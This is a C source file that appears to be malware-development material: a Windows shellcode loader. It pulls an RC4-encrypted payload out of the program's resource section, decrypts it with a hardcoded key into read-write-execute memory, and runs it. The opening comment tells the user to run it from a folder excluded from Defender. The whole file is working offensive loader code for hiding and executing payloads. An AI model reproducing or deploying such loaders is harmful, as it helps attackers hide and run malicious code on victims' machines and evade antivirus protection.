// Run this script in a folder exceptioned by Defender.
#include <stdio.h>
#include <Windows.h>
#include "resource.h"

typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;


void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)
{
	unsigned int i;
	unsigned int j;
	unsigned char temp;

	// Check parameters
	if (context == NULL || key == NULL)
		return ERROR_INVALID_PARAMETER;

	// Clear context
	context->i = 0;
	context->j = 0;

	// Initialize the S array with identity permutation
	for (i = 0; i < 256; i++)
	{
		context->s[i] = i;
	}

	// S is then processed for 256 iterations
	for (i = 0, j = 0; i < 256; i++)
	{
		//Randomize the permutations using the supplied key
		j = (j + context->s[i] + key[i % length]) % 256;

		//Swap the values of S[i] and S[j]
		temp = context->s[i];
		context->s[i] = context->s[j];
		context->s[j] = temp;
	}

}


void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {
	unsigned char temp;

	// Restore context
	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char* s = context->s;

	// Encryption loop
	while (length > 0)
	{
		// Adjust indices
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		// Swap the values of S[i] and S[j]
		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		// Valid input and output?
		if (input != NULL && output != NULL)
		{
			//XOR the input data with the RC4 stream
			*output = *input ^ s[(s[i] + s[j]) % 256];

			//Increment data pointers
			input++;
			output++;
		}

		// Remaining bytes to process
		length--;
	}

	// Save context
	context->i = i;
	context->j = j;
}


int main() {

	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;
	PVOID		pPayloadAddress = NULL;
	SIZE_T		sPayloadSize = NULL;


	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// in case of function failure 
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		// in case of function failure 
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Printing pointer and size to the screen
	printf("[i] Base Address of Allocated Memory for Encrypted Shellcode : 0x%p \n", pPayloadAddress);

	// Allocating memory buffer to modify rsrc encrypted payload using VirtualAlloc call
	PVOID ciphertext = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (ciphertext != NULL) {
		// copying the payload from resource section to the new buffer 
		memcpy(ciphertext, pPayloadAddress, sPayloadSize);
	}
	else {
		// Error handling
		printf("[!] VirtualAlloc failed with error : %d \n", GetLastError());
		return -1;
	}

	// Initialization
	Rc4Context ctx = { 0 };

	// Key used for decryption
	unsigned char* key = "bWFsZGV2MTIzCg==";

	rc4Init(&ctx, key, sizeof(key));

	size_t shellcodeLength = sPayloadSize;
	DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
	DWORD flProtect = PAGE_EXECUTE_READWRITE;
	PVOID plaintext = VirtualAlloc(NULL, shellcodeLength, flAllocationType, flProtect);

  if (!plaintext)
	{
		fprintf(stderr, "Error allocating memory for the encrypted shellcode.\n");
		return EXIT_FAILURE;
	}

	printf("[+] Base Address of Allocated Memory for Decrypted Shellcode: 0x%p\n", plaintext);

	// Decryption //
	// ciphertext - Encrypted payload to be decrypted
	// plaintext - A buffer that is used to store the outputted plaintext data
	rc4Cipher(&ctx, ciphertext, plaintext, shellcodeLength);

	printf("[!] Shellcode successfully decrypted!\n");

	// Declare a function pointer type that matches the shellcode signature
	typedef void (*ShellcodeFunction)();

	// Cast the executable buffer as a function pointer
	ShellcodeFunction shellcodeFunc = (ShellcodeFunction)plaintext;

	// Call the shellcode function
	shellcodeFunc();

	// Free the executable buffer
	VirtualFree(plaintext, 0, MEM_RELEASE);
	VirtualFree(ciphertext, 0, MEM_RELEASE);

	return 0;
}
